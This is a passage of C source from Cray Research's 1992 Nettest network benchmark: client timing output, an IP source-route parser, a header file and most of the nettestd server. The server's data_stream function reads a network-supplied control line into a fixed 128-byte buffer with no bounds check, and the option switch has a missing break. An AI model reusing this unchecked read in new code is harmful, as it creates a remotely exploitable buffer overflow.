	prtimes(&start, &turnaround, &end, &tms1, &tms2, &tms3);

	j = 0;
	for (i = 0; i <= chunksize; i++)
		if (cnts[i]) {
			printf("%6d: %5d ", i, cnts[i]);
			if (++j == 4) {
				printf("\n");
				j = 0;
			}
		}
	if (j)
		printf("\n");
#ifndef	NO_ISO
	/* send out ISO sync data to server */
	if (domain == D_ISO) {
		strncpy(data, "DONE", 4);
		write(out, data, 4);
		sleep(1);	/* wait for packet to reach server */
	}
#endif /* NO_ISO */
	return;
bad:
	perror(buf);
	exit(1);
}

	void
usage()
{
	fprintf(stderr, "%s\n%s\n%s\n%s\n%s\n",
"Usage: nettest [-cdfFh] [-b bufsize] [-s winshift] [-S tos] [-n #streams]",
"               [-p tcp|udp|iso] [host [count [size [port]]]]",
"       nettest [-cdfh] [-b bufsize] -p unix|pipes [-n #streams]",
"               [count [size [filename]]]",
"       nettest [-cdfh] [-b bufsize] -p file file1 file2 [count [size]]",
"       nettest -V\n");
	exit(1);
}

	void
do_dgram(s)
	register int s;
{
	register int	ret, i;
	register char	*data;
	char		*malloc();
	struct tms	tms1, tms2;
	TIMETYPE	start, end;
	struct msghdr	outmsg;
	struct iovec	iov;

	data = malloc(chunksize);
	if (data == NULL) {
		fprintf(stderr, "cannot malloc enough space\n");
		exit(1);
	}

	iov.iov_base = data;
	iov.iov_len = chunksize;
	bzero((char *)&outmsg, sizeof(outmsg));
	outmsg.msg_iov = &iov;
	outmsg.msg_iovlen = 1;
	outmsg.msg_name = (caddr_t)&name;
	outmsg.msg_namelen = namesize;
	GETTIMES(start, tms1);


	*data = 0;
	for (i = 0; i < nchunks; i++) {
		ret = mesghdr ? sendmsg(s, &outmsg, 0)
			: sendto(s, data, chunksize, 0, (caddr_t)&name,
						namesize);

		if (ret < 0) {
			perror(mesghdr ? "sendmsg" : "sendto");
			printf("%d out of %d sent\n", i, nchunks);
			exit(1);
		}
		if (ret != chunksize)
			printf("%s returned %d, expected %d\n",
				mesghdr ? "sendmsg" : "sendto", ret, chunksize);
		(*data)++;
	}

	GETTIMES(end, tms2);

	/*
	 * Pass in same middle and end times because we only do writes for udp.
	*/
	prtimes(&start, &end, &end, &tms1, &tms2, &tms2);
}

	void
prtimes(p0, p1, p2, tms1, tms2, tms3)
	TIMETYPE	*p0, *p1, *p2;
	struct tms	*tms1, *tms2, *tms3;
{
	float	t1, t2;

#if	!defined(CRAY) && !defined(SYSV) && !defined(sgi)
	t1 = (p1->time - p0->time)*1000L
		 + p1->millitm - p0->millitm;
	t2 = (p2 ? ((p2->time - p1->time)*1000L
		 + p2->millitm - p1->millitm) : 0.0);
#else
	t1 = (float)(*p1 - *p0)*1000.0/HZ;
	t2 = (p2 ? ((float)(*p2 - *p1)*1000.0/HZ) : 0.0);
#endif
	tms1->tms_utime = tms2->tms_utime - tms1->tms_utime;
	tms1->tms_stime = tms2->tms_stime - tms1->tms_stime;
	tms2->tms_utime = tms3 ? (tms3->tms_utime - tms2->tms_utime) : 0;
	tms2->tms_stime = tms3 ? (tms3->tms_stime - tms2->tms_stime) : 0;
	printf("           Real  System            User          Kbyte   Mbit(K^2) mbit(1+E6)\n");
#define FORMAT "%7s %7.4f %7.4f (%4.1f%%) %7.4f (%4.1f%%) %7.2f %7.3f   %7.3f\n"
    if (t1 && p2)
	printf(FORMAT, "write", t1/1000.0,
		(float)tms1->tms_stime/HZ,
		(float)tms1->tms_stime/t1*100000.0/HZ,
		(float)tms1->tms_utime/HZ,
		(float)tms1->tms_utime/t1*100000.0/HZ,
		(chunksize*nchunks)/(1024.0*(t1/1000.0)),
		(chunksize*nchunks)/(128.0*1024.0*(t1/1000.0)),
		(chunksize*nchunks)/(125.0*t1));
    if (t2 && p2)
	printf(FORMAT, "read", t2/1000.0,
		(float)tms2->tms_stime/HZ,
		(float)tms2->tms_stime/t2*100000.0/HZ,
		(float)tms2->tms_utime/HZ,
		(float)tms2->tms_utime/t2*100000.0/HZ,
		(chunksize*nchunks)/(1024.0*(t2/1000.0)),
		(chunksize*nchunks)/(128.0*1024.0*(t2/1000.0)),
		(chunksize*nchunks)/(125.0*t2));
    if ((t1 && t2) || (!p2 && (t1 + t2)))
	printf(FORMAT, "r/w", (t2+t1)/1000.0,
		(float)(tms1->tms_stime + tms2->tms_stime)/HZ,
		(float)(tms1->tms_stime + tms2->tms_stime)/(t1+t2)*100000.0/HZ,
		(float)(tms1->tms_utime + tms2->tms_utime)/HZ,
		(float)(tms1->tms_utime + tms2->tms_utime)/(t1+t2)*100000.0/HZ,
		(chunksize*nchunks)/(512.0*((t1 + t2)/1000.0)),
		(chunksize*nchunks)/(64.0*1024.0*((t1 + t2)/1000.0)),
		(chunksize*nchunks)/(62.5*(t1 + t2)));
}
#if	defined(SRCRT) && defined(IPPROTO_IP)

/*
 * Source route is handed in as
 *	[!]@hop1@hop2...[@|:]dst
 * If the leading ! is present, it is a
 * strict source route, otherwise it is
 * assmed to be a loose source route.
 *
 * We fill in the source route option as
 *	hop1,hop2,hop3...dest
 * and return a pointer to hop1, which will
 * be the address to connect() to.
 *
 * Arguments:
 *	arg:	pointer to route list to decipher
 *
 *	cpp: 	If *cpp is not equal to NULL, this is a
 *		pointer to a pointer to a character array
 *		that should be filled in with the option.
 *
 *	lenp:	pointer to an integer that contains the
 *		length of *cpp if *cpp != NULL.
 *
 * Return values:
 *
 *	Returns the address of the host to connect to.  If the
 *	return value is -1, there was a syntax error in the
 *	option, either unknown characters, or too many hosts.
 *	If the return value is 0, one of the hostnames in the
 *	path is unknown, and *cpp is set to point to the bad
 *	hostname.
 *
 *	*cpp:	If *cpp was equal to NULL, it will be filled
 *		in with a pointer to our static area that has
 *		the option filled in.  This will be 32bit aligned.
 *
 *	*lenp:	This will be filled in with how long the option
 *		pointed to by *cpp is.
 *
 */
	unsigned long
sourceroute(arg, cpp, lenp)
	char	*arg;
	char	**cpp;
	int	*lenp;
{
	static char lsr[44];
	char *cp, *cp2, *lsrp, *lsrep, *index();
	register int tmp;
	struct in_addr sin_addr;
	register struct hostent *host = 0;
	register char c;

	/*
	 * Verify the arguments, and make sure we have
	 * at least 7 bytes for the option.
	 */
	if (cpp == NULL || lenp == NULL)
		return((unsigned long)-1);
	if (*cpp != NULL && *lenp < 7)
		return((unsigned long)-1);
	/*
	 * Decide whether we have a buffer passed to us,
	 * or if we need to use our own static buffer.
	 */
	if (*cpp) {
		lsrp = *cpp;
		lsrep = lsrp + *lenp;
	} else {
		*cpp = lsrp = lsr;
		lsrep = lsrp + 44;
	}

	cp = arg;

	/*
	 * Next, decide whether we have a loose source
	 * route or a strict source route, and fill in
	 * the begining of the option.
	 */
	if (*cp == '!') {
		cp++;
		*lsrp++ = IPOPT_SSRR;
	} else
		*lsrp++ = IPOPT_LSRR;

	if (*cp != '@')
		return((unsigned long)-1);

	lsrp++;		/* skip over length, we'll fill it in later */
	*lsrp++ = 4;

	cp++;

	sin_addr.s_addr = 0;

	for (c = 0;;) {
		if (c == ':')
			cp2 = 0;
		else for (cp2 = cp; c = *cp2; cp2++) {
			if (c == ',') {
				*cp2++ = '\0';
				if (*cp2 == '@')
					cp2++;
			} else if (c == '@') {
				*cp2++ = '\0';
			} else if (c == ':') {
				*cp2++ = '\0';
			} else
				continue;
			break;
		}
		if (!c)
			cp2 = 0;

		if ((tmp = inet_addr(cp)) != -1) {
			sin_addr.s_addr = tmp;
		} else if (host = gethostbyname(cp)) {
#if	defined(h_addr)
			memcpy((caddr_t)&sin_addr,
				host->h_addr_list[0], host->h_length);
#else
			memcpy((caddr_t)&sin_addr, host->h_addr, host->h_length);
#endif
		} else {
			*cpp = cp;
			return(0);
		}
		memcpy(lsrp, (char *)&sin_addr, 4);
		lsrp += 4;
		if (cp2)
			cp = cp2;
		else
			break;
		/*
		 * Check to make sure there is space for next address
		 */
		if (lsrp + 4 > lsrep)
			return((unsigned long)-1);
	}
	if ((*(*cpp+IPOPT_OLEN) = lsrp - *cpp) <= 7) {
		*cpp = 0;
		*lenp = 0;
		return((unsigned long)-1);
	}
	*lsrp++ = IPOPT_NOP; /* 32 bit word align it */
	*lenp = lsrp - *cpp;
	return(sin_addr.s_addr);
}
#endif

#ifndef	HAS_PARSETOS

#define	MIN_TOS	0
#define	MAX_TOS	255

	int
parsetos(name, proto)
	char	*name;
	char	*proto;
{
	register char	*c;
	int		tos;
#if !defined(sgi)
#ifdef	IP_TOS
	struct tosent	*tosp;

	tosp = gettosbyname(name, proto);
	if (tosp) {
		tos = tosp->t_tos;
	} else {
#endif
#endif
		for (c = name; *c; c++) {
			if (*c < '0' || *c > '9') {
				return (-1);
			}
		}
		tos = (int)strtol(name, (char **)NULL, 0);
#if !defined(sgi)
#ifdef	IP_TOS
	}
#endif
#endif
	if (tos < MIN_TOS || tos > MAX_TOS) {
		return (-1);
	}
	return (tos);
}
#endif
::::::::::::::
craynettest.h
::::::::::::::
/* USMID @(#)tcp/usr/etc/nettest/nettest.h	80.2	11/03/92 17:12:29 */

/*
 * Copyright 1992 Cray Research, Inc.
 * All Rights Reserved.
 */
/*
 * Permission to use, copy, modify and distribute this software, in
 * source and binary forms, and its documentation, without fee is
 * hereby granted, provided that:  1) the above copyright notice and
 * this permission notice appear in all source copies of this
 * software and its supporting documentation; 2) distributions
 * including binaries display the following acknowledgement:  ``This
 * product includes software developed by Cray Research, Inc.'' in
 * the documentation or other materials provided with the distribution
 * and in all advertising materials mentioning features or use of
 * this software; 3) the name Cray Research, Inc. may not be used to
 * endorse or promote products derived from this software without
 * specific prior written permission; 4) the USMID revision line and
 * binary copyright notice are retained without modification in all
 * source and binary copies of this software; 5) the software is
 * redistributed only as part of a bundled package and not as a
 * separate product (except that it may be redistibuted separately if
 * if no fee is charged); and 6) this software is not renamed in any
 * way and is referred to as Nettest.
 *
 * THIS SOFTWARE IS PROVIDED AS IS AND CRAY RESEARCH, INC.
 * DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE, INCLUDING
 * ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE.  IN NO EVENT SHALL CRAY RESEARCH, INC. BE
 * LIABLE FOR ANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS,
 * WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS
 * ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
 * PERFORMANCE OF THIS SOFTWARE.
 */

#define	CHUNK	4096
#define	NCHUNKS	100

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/times.h>
#if	defined(CRAY) || defined(SYSV) || defined(sgi)
#include <sys/param.h>
#else
#define	HZ	60
#include <sys/timeb.h>
#endif	/* CRAY */
#define	UNIXPORT	"nt_socket"
#define	UNIXDPORT	"nt_dsocket"
#define	PIPENAME	"nt_npipe"
#define	PORTNUMBER	(IPPORT_RESERVED + 42)
::::::::::::::
craynettestd.c
::::::::::::::
static char USMID[] = "@(#)tcp/usr/etc/nettest/nettestd.c	80.5	11/03/92 17:12:29";

/*
 * Copyright 1992 Cray Research, Inc.
 * All Rights Reserved.
 */
/*
 * Permission to use, copy, modify and distribute this software, in
 * source and binary forms, and its documentation, without fee is
 * hereby granted, provided that:  1) the above copyright notice and
 * this permission notice appear in all source copies of this
 * software and its supporting documentation; 2) distributions
 * including binaries display the following acknowledgement:  ``This
 * product includes software developed by Cray Research, Inc.'' in
 * the documentation or other materials provided with the distribution
 * and in all advertising materials mentioning features or use of
 * this software; 3) the name Cray Research, Inc. may not be used to
 * endorse or promote products derived from this software without
 * specific prior written permission; 4) the USMID revision line and
 * binary copyright notice are retained without modification in all
 * source and binary copies of this software; 5) the software is
 * redistributed only as part of a bundled package and not as a
 * separate product (except that it may be redistibuted separately if
 * if no fee is charged); and 6) this software is not renamed in any
 * way and is referred to as Nettest.
 *
 * THIS SOFTWARE IS PROVIDED AS IS AND CRAY RESEARCH, INC.
 * DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE, INCLUDING
 * ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE.  IN NO EVENT SHALL CRAY RESEARCH, INC. BE
 * LIABLE FOR ANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS,
 * WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS
 * ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
 * PERFORMANCE OF THIS SOFTWARE.
 */
char copyright[] =
"@(#) Copyright 1992 Cray Research, Inc.\n\
 All rights reserved.\n";

#include "nettest.h"

#include <errno.h>
#include <signal.h>
#ifdef	WAIT3CODE
#include <sys/wait.h>
#endif
#include <sys/un.h>
#include <sys/stat.h>
#include <fcntl.h>
#ifdef	CRAY2
#include <sys/sysmacros.h>
#endif
#include <netinet/tcp.h>
#ifndef	NO_ISO
#include <netiso/iso.h>
#include <netiso/tp_user.h>
#include <netinet/in.h>
#endif	/* NO_ISO */
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <syslog.h>
#if defined(sgi)
#include <termios.h>
#else
#include <sys/termios.h>
#endif

#ifdef	WAIT3CODE
dochild()
{
	int pid;

	while ((pid = wait3(0, WNOHANG, 0)) > 0)
		;
}
#else
#define	dochild	SIG_IGN
#endif

int dflag;
int	ipoptions = 0;
int	mesghdr = 0;
#define	debug(x)	if(dflag>1)fprintf x
int verbose;
int daemon = 0;		/* are we running in daemon mode? */

#ifdef	TCP_WINSHIFT
int	winshift;
int	usewinshift;
#endif

#define	D_PIPE	1
#define	D_UNIX	2
#define	D_INET	3
#define	D_FILE	4
#ifndef NO_ISO
#define D_ISO	5
#endif /* NO_ISO */

int domain = D_INET;
int type = SOCK_STREAM;

union {
	struct sockaddr		d_gen;
	struct sockaddr_un	d_unix;
	struct sockaddr_in	d_inet;
#ifndef NO_ISO
	struct sockaddr_iso	d_iso;
#endif /* NO_ISO */
} name;
int namesize;

int read(), recv();
int (*rfunc)() = read;

main(argc, argv)
int argc;
char **argv;
{
	register int	s, s2, mode, dev1, dev2;
	char		*portname = 0;
	short		port = PORTNUMBER;
	int		on = 1;
	int		c;
	char		*f1, *f2;
#ifndef NO_ISO
	/* OSI transport selector */
	union {
		int	port;
		char	data[sizeof(int)];
	} portnumber;
#endif /* NO_ISO */
	char		buf[256], buf2[256];
	extern int	optind;
	extern char	*optarg;

	while ((c = getopt(argc, argv, "bdimp:s:vV")) != EOF) {
		switch(c) {
		case 'b':	/* run as a background daemon */
			if (verbose) {
				fprintf(stderr,
				    "-v flag ignored when -b flag is used\n");
				verbose = 0;
			}
			daemon++;
			break;
		case 'd':	/* turn on socket level debugging */
			++dflag;
			break;
		case 'i':
			ipoptions++;
			break;
		case 'm':	/* use recvmsg() instead of recvfrom() */
#ifdef CMSG_DATA
			++mesghdr;
#else
			printf("'m' flag not supported\n");
#endif
			break;
		case 'p':	/* specify the protocol to use */
			if (!strcmp(optarg, "unix")) {
				domain = D_UNIX;
				type = SOCK_STREAM;
			} else if (!strcmp(optarg, "unixd")) {
				domain = D_UNIX;
				type = SOCK_DGRAM;
			} else if (!strcmp(optarg, "iso")) {
#ifndef	NO_ISO
				domain = D_ISO;
				type = SOCK_SEQPACKET;
#else
				printf("Unsupported protocol: %s\n", optarg);
				usage();
#endif /* NO_ISO */
			} else if (!strcmp(optarg, "tcp")) {
				domain = D_INET;
				type = SOCK_STREAM;
			} else if (!strcmp(optarg, "udp")) {
				domain = D_INET;
				type = SOCK_DGRAM;
			} else if (!strcmp(optarg, "file")) {
				domain = D_FILE;
			} else if (!strcmp(optarg, "pipe")) {
#ifdef	NAMEDPIPES
				domain = D_PIPE;
#else
				printf("Unsupported protocol: %s\n", optarg);
				usage();
#endif	/* NAMEDPIPES */
			} else {
				printf("Unknown protocol: %s\n", optarg);
				usage();
			}
			break;

		case 's':	/* set the default window shift value */
#ifdef	TCP_WINSHIFT
			usewinshift++;
			winshift = atoi(optarg);
			if (winshift < -1 || winshift > 14) {
				fprintf(stderr, "window shift (-s) must be beteen -1 and 14\n");
				usage();
			}
#else
			fprintf(stderr, "window shift option not supported\n");
			usage();
#endif

		case 'v':	/* print out errors in sequenced data */
			if (daemon) {
				fprintf(stderr,
				    "-v flag ignored when -b flag is used\n");
				verbose = 0;
			} else {
				++verbose;
			}
			break;

		case 'V':	/* print out version & copyright info */
			printf("%s\n%s", &USMID[4], &copyright[4]);
			exit(0);

		case '?':
		default:
			usage();
			break;
		}
	}
	argc -= optind;
	argv += optind;

#ifdef	TCP_WINSHIFT
	if (usewinshift && ((domain != D_INET) || (type != SOCK_STREAM))) {
	    fprintf(stderr,
		"nettestd: -s option ignored (only valid for tcp)\n");
	    usewinshift = 0;
	}
#endif
	if (mesghdr && (type != SOCK_DGRAM)) {
	    fprintf(stderr,
		"nettestd: -m option ignored (only valid for udp and unixd)\n");
	    mesghdr = 0;
	}
	if (ipoptions && ((domain != D_INET) && (type != SOCK_DGRAM))) {
	    fprintf(stderr,
		"nettestd: -i option ignored (only valid for udp)\n");
	    ipoptions = 0;
	}

	if (domain == D_FILE) {
		if (argc != 2)
			usage();
		f1 = *argv++;
		f2 = *argv++;
		argc -= 2;
	} else if (argc > 1)
		usage();
	else if (argc == 1) {
		portname = *argv++;
		argc--;
		port = atoi(portname);
	}

#ifndef	_PATH_TTY
# define _PATH_TTY "/dev/tty"
#endif
#ifndef	TIOCNOTTY
# ifdef	TIOCSCTTY
#  define TIOCNOTTY TIOCSCTTY
# else
#  ifdef TCSETCTTY
#   define TIOCNOTTY TCSETCTTY
#  endif
# endif
#endif
	if (daemon) {
		if (setpgrp() < 0)
			perror("setpgrp");
		if ((c = open(_PATH_TTY, O_RDWR)) >= 0) {
			(void)ioctl(c, TIOCNOTTY, (char *)0);
			(void)close(c);
		}
		switch (fork()) {
		default:	/* in the parent */
			exit(0);
		case -1:	/* fork failed */
			perror("nettestd: fork");
			exit(1);
		case 0:		/* in the child */
			break;
		}
		for (c = getdtablesize(); c >= 0; --c)
			(void)close(c);
	}

	switch (domain) {
#ifdef	NAMEDPIPES
	case D_PIPE:
		if (portname == 0)
			portname = PIPENAME;
		mode = S_IFIFO|0666;
		dev1 = dev2 = 0;
		sprintf(buf, "%sR", portname);
		sprintf(buf2, "%sW", portname);
		umask(0);
		for(;;) {
			unlink(buf);
			if (mknod(buf, mode, dev1) < 0) {
				error("mknod");
				exit(1);
			}
			unlink(buf2);
			if (mknod(buf2, mode, dev2) < 0) {
				error("mknod");
				goto err1;
			}
			if ((s2 = open(buf2, O_RDONLY)) < 0) {
				error(buf2);
				goto err2;
			}
			if ((s = open(buf, O_WRONLY)) < 0) {
				error(buf);
				close(s2);
			err2:	unlink(buf2);
			err1:	unlink(buf);
				exit(1);
			}
			data_stream(s2, s);
			close(s2);
			close(s);
		}
		break;
#endif	/* NAMEDPIPES */
	case D_FILE:
		for(;;) {
			s = open(f1, 0);
			if (s < 0) {
				error(f1);
				exit(1);
			}
			s2 = open(f2, 1);
			if (s2 < 0) {
				error(f2);
				exit(1);
			}
			data_stream(s, s2);
			close(s2);
			close(s);
			sleep(1);
		}
		break;

	case D_UNIX:
		if (portname == 0)
			portname = (type == SOCK_DGRAM) ? UNIXDPORT : UNIXPORT;
		name.d_unix.sun_family = AF_UNIX;
		strcpy(name.d_unix.sun_path, portname);
		namesize = sizeof(name.d_unix) - sizeof(name.d_unix.sun_path)
				+ strlen(name.d_unix.sun_path);
		(void) unlink(portname);
		goto dosock;
		break;

	case D_INET:
		name.d_inet.sin_family = AF_INET;
		if (port <= 0) {
			fprintf(stderr, "bad port number\n");
			exit(1);
		}
		name.d_inet.sin_port = htons(port);
#if	!defined(CRAY) || defined(s_addr)
		name.d_inet.sin_addr.s_addr = 0;
#else
		name.d_inet.sin_addr = 0;
#endif
		namesize = sizeof(name.d_inet);
		goto dosock;
		break;

#ifndef NO_ISO
	case D_ISO:

		name.d_iso.siso_len = sizeof(struct sockaddr_iso);
		name.d_iso.siso_family = AF_ISO;
		name.d_iso.siso_tlen = 2;
		if ((port <= 0) || (port > 65535)) {
			fprintf(stderr, "bad ISO port number\n");
			exit(1);
		}
		portnumber.port = htons(port);
		bcopy(&(portnumber.data[(sizeof(int)-2)]),
						TSEL(&(name.d_iso)), 2);
		namesize = sizeof(name.d_iso);

#endif /* NO_ISO */
	dosock:
		if ((s = socket(name.d_gen.sa_family, type, 0)) < 0) {
			error("socket");
			exit(1);
		}
		if (dflag && setsockopt(s, SOL_SOCKET, SO_DEBUG, &on, sizeof(on)) < 0)
			error("setsockopt - SO_DEBUG");
		setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
#if defined(IP_RECVOPTS) || defined(IP_RECVRETOPTS) || defined(IP_RECVDSTADDR)
		if (ipoptions)
			if(
# if	defined(IP_RECVOPTS)
				setsockopt(s, IPPROTO_IP,
					IP_RECVOPTS, &on, sizeof(on)) < 0
# endif
# if	defined(IP_RECVRETOPTS)
			    ||	setsockopt(s, IPPROTO_IP,
					IP_RECVRETOPTS, &on, sizeof(on)) < 0
# endif
# if	defined(IP_RECVDSTADDR)
			    ||	setsockopt(s, IPPROTO_IP,
					IP_RECVDSTADDR, &on, sizeof(on)) < 0
# endif
			    )
			error("setsockopt (IP_OPTIONS)");
#endif
		if (bind(s, (char *)&name, namesize) < 0) {
			error("bind");
			exit(1);
		}
		if (type == SOCK_DGRAM)
			do_dgram(s);
		else
			do_stream(s);
		/*NOTREACHED*/
		break;
	}
}

do_stream(s)
register int s;
{
	register int		i, s2;
#ifndef NO_ISO
	struct sockaddr_iso	isoname;/*ZAP*/
#endif /* NO_ISO */
	int			kbufsize;

#ifdef	TCP_WINSHIFT
	if (usewinshift) {
		if (setsockopt(s, IPPROTO_TCP, TCP_WINSHIFT, &winshift,
						sizeof(winshift)) < 0)
			error("setsockopt - TCP_WINSHIFT");
	}
#endif
	listen(s, 5);

	signal(SIGCHLD, dochild);
	for (;;) {
		namesize = sizeof(name);
		s2 = accept(s, (char *)&name, &namesize);
		if (s2 < 0) {
			extern int errno;
			if (errno == EINTR)
				continue;
			error("accept");
		} else {
			if ((i = fork()) == 0) {
				close(s);
				i = data_stream(s2, s2);
				shutdown(s2, 2);
				exit(i);
			} else if (i < 0)
				error("fork");
			close(s2);
		}
	}
}


#ifndef	CRAY
#define	VRFY() { \
		register int j, k; \
		register long *ldp = (long *)(data + (offset&~0x7)); \
		register int len = t + (offset&0x7); \
		for (j = 0; j < len/8; j++) { \
			k = (ntohl(*ldp++) != hival); \
			if ((ntohl(*ldp++) != loval) || k) { \
				printf("expected %8x%8x, got %8x%8x\n", \
					hival, loval, ntohl(*(ldp-2)), \
					ntohl(*(ldp-1))); \
				hival = ntohl(*(ldp-2)); \
				loval = ntohl(*(ldp-1)); \
			} \
			if (++loval == 0) \
				++hival; \
		} \
		if ((len&0x7) && (offset+t) >= chunksize) { \
			*(ldp-(chunksize/8)) = *ldp; \
			*(ldp-(chunksize/8)+1) = *(ldp+1); \
		} \
	}
#else
#define	VRFY() { \
		register int j; \
		register long *ldp = (long *)(data + (offset&~0x7)); \
		register int len = t + (offset&0x7); \
		for (j = 0; j < len/8; j++) { \
			if (*ldp++ != loval) { \
				printf("expected %16x, got %16x\n", \
					loval, *(ldp-1)); \
				loval = *(ldp-1); \
			} \
			++loval; \
		} \
		if ((len&0x7) && ((offset+t) >= chunksize)) { \
			*(ldp-(chunksize/8)) = *ldp; \
		} \
	}
#endif

data_stream(in, out)
register in, out;
{
	register int	i, t, offset = 0;
	register char	*cp, *data;
	char		buf[128], *malloc();
	int		chunks = 0, chunksize = 0, fullbuf = 0, kbufsize = 0;
	int		tos = 0, nodelay = 0, seqdata = 0, waitall = 0;
	register unsigned long hival, loval;

#ifndef NO_ISO
	/* read ISO CR - 0 bytes of data */
	if (domain == D_ISO) {
		if ((i = read(in, buf, sizeof(buf))) != 0) {
			fprintf(stderr, "read(ISO CR) failed\n");
			exit(1);
		}
	}
#endif /* NO_ISO */
	for (cp = buf; ; ) {
		i = read(in, cp, 1);
		if (i != 1) {
			if (i < 0)
				error("nettestd: read");
			else
				fprintf(stderr, "nettestd: Read returned %d, expected 1\n", i);
			exit(1);
		}
		if (*cp == '\n')
			break;
		cp++;
	}
	*cp = '\0';
	sscanf(buf, "%d %d %d %d %d %d %d %d", &chunks, &chunksize, &fullbuf,
				&kbufsize, &tos, &nodelay, &seqdata, &waitall);
	/*
	 * If fullbuf is set, allocate a buffer twice as big.  This
	 * is so that we can always read a full size buffer, from
	 * the offset of the last read.  This keeps the data in
	 * the first chunksize consistent in case the remote side
	 * is trying to verify the contents.
	 */
	data = malloc(fullbuf ? 2*chunksize : chunksize);
	if (data == NULL) {
		sprintf(buf, "0 malloc() failed\n");
		write(out, buf, strlen(buf));
		return(1);
	}
	strcpy(buf, "1");
	if (kbufsize) {
#ifdef	SO_SNDBUF
		if ((setsockopt(out, SOL_SOCKET, SO_SNDBUF, &kbufsize,
						sizeof(kbufsize)) < 0) ||
		    (setsockopt(in, SOL_SOCKET, SO_RCVBUF, &kbufsize,
						sizeof(kbufsize)) < 0))
#endif
			strcat(buf, " Cannot set buffers sizes.");
	}
	if (tos) {
#ifdef	IP_TOS
		if (setsockopt(out, IPPROTO_IP, IP_TOS, &tos, sizeof(tos)) < 0)
#endif
			strcat(buf, " Cannot set TOS bits.");
	}
	if (nodelay) {
#ifdef	TCP_NODELAY
		if (setsockopt(out, IPPROTO_TCP, TCP_NODELAY, &nodelay,
							sizeof(nodelay)) < 0)
#endif
			strcat(buf, " Cannot set TCP_NODELAY.");
	}
	if (waitall) {
#ifdef	MSG_WAITALL
		waitall = MSG_WAITALL;
		rfunc = recv;
#else
		strcat(buf, " MSG_WAITALL not supported.");
		waitall = 0;
#endif
	}
	strcat(buf, " \n");
	write(out, buf, strlen(buf));
	hival = loval = 0;
	for (i = 0; i < chunks || offset; i++) {
		if ((t = (*rfunc)(in, data + offset, chunksize, waitall)) < 0) {
			sprintf(buf, "server: read #%d.%d", i+1, chunksize);
			goto bad;
		}
		if (t == 0) {
			fprintf(stderr, "server: EOF on read, block # %d\n", i);
			break;
		}
		if (verbose && seqdata)
			VRFY();
/*@*/		debug((stderr, "server: %d: read %d\n", i, t));
		if (fullbuf) {
			offset += t;
			if (offset >= chunksize)
				offset -= chunksize;
			else
				--i;
		} else while (t != chunksize) {
			register int t2;
			t2 = (*rfunc)(in, data+t, chunksize-t, waitall);
			if (verbose && seqdata)
				VRFY();
			if (t2 < 0) {
				sprintf(buf, "server: read #%d.%d",
							i+1, chunksize-t);
				goto bad;
			}
			if (t2 == 0) {
				fprintf(stderr, "server: EOF on read, block # %d\n", i);
				break;
			}
			t += t2;
/*@*/			debug((stderr, "server: %d: partial read %d (%d)\n", i, t2, t));
		}
	}

	hival = loval = 0;
	for (i = 0; i < chunks; i++) {
		if (seqdata) {
			register int j;
			register long *ldp = (long *)data;
			for (j = 0; j < chunksize/8; j++) {
#ifndef	CRAY
				*ldp++ = htonl(hival);
				*ldp++ = htonl(loval);
				if (++loval == 0)
					++hival;
#else
				*ldp++ = loval++;
#endif
			}
		}
		if ((t = write(out, data, chunksize)) < 0) {
			sprintf(buf, "server: write #%d", i+1);
			goto bad;
		}
		if (t != chunksize)
			fprintf(stderr, "server: write: %d vs %d\n", t, chunksize);
/*@*/		else
/*@*/			debug((stderr, "server: %d: write %d\n", i, t));
	}
#ifndef	NO_ISO
	/* read ISO sync-up data */
	if (domain == D_ISO) {
		if ((i = read(in, buf, sizeof(buf))) == 4) {
			if (strncmp(buf, "DONE", 4))
				fprintf(stderr,
					"OSI server got wrong sync-up data\n");
		} else
			fprintf(stderr,
				"OSI server got wrong size sync-up (%d)\n", i);
	}
#endif /* NO_ISO */
	free(data);
	return(0);
bad:
	error(buf);
	free(data);
	return(1);
}

#define	MAXSIZE	(64*1024)

do_dgram(s)
int s;
{
	register int		t, t2;
	register char		*cp, *data;
	register struct hostent	*hp;
	char			*inet_ntoa(), *malloc();
	register char		*errmsg;
#ifdef	CMSG_DATA
	struct msghdr		inmsg;
	struct iovec		iov;
	char			control[3*(sizeof(struct cmsghdr)+40)];
	register struct cmsghdr	*cm;
#endif /* CMSG_DATA */

	data = malloc(MAXSIZE);
	if (data == NULL) {
		fprintf(stderr, "no malloc\n");
		shutdown(s, 2);
		exit(1);
	}
#ifdef CMSG_DATA
	if(mesghdr) {
		iov.iov_base = data;
		iov.iov_len = MAXSIZE;
		inmsg.msg_iov = &iov;
		inmsg.msg_iovlen = 1;
		inmsg.msg_name = (caddr_t)&name.d_inet;
		inmsg.msg_control = (caddr_t)control;
		inmsg.msg_flags = 0;
		errmsg = "recvmsg";
	} else
#endif /* CMSG_DATA */
		errmsg = "recvfrom";

	for (;;) {
#ifdef CMSG_DATA
		if (mesghdr) {
			inmsg.msg_namelen = sizeof(name.d_inet);
			inmsg.msg_controllen = sizeof(control);
			t = recvmsg(s, &inmsg, 0);
		} else
#endif
		{
			namesize = sizeof(name.d_inet);
			t = recvfrom(s, data, MAXSIZE, 0, (char *)&name.d_inet,
				 &namesize);
		}
		if (t < 0) {
			error(errmsg);
			continue;
		}
		if (domain == D_INET) {
			cp = inet_ntoa(name.d_inet.sin_addr);
			printf("got %d bytes from %s\n", t, cp);
		} else
			printf("got %d bytes\n", t);
	}
}

usage()
{
	fprintf(stderr, "%s%s%s%s%s",
